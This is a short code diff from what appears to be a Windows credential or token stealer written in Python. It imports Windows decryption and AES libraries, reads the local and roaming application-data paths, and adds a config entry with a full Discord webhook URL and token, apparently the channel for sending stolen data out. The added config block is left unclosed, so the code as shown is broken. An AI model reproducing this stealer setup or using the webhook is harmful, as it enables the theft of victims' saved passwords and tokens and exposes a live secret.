@@ -21,7 +21,10 @@ install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
 
 import win32crypt
 from Crypto.Cipher import AES
-
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1346351370483007549/3gaTwXJouo6edYnRkkqxbl-Ri9cTScmwmJAO-oseC6lnUcQrfuk8gGpI5IyNNbxONbKq",
+    
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
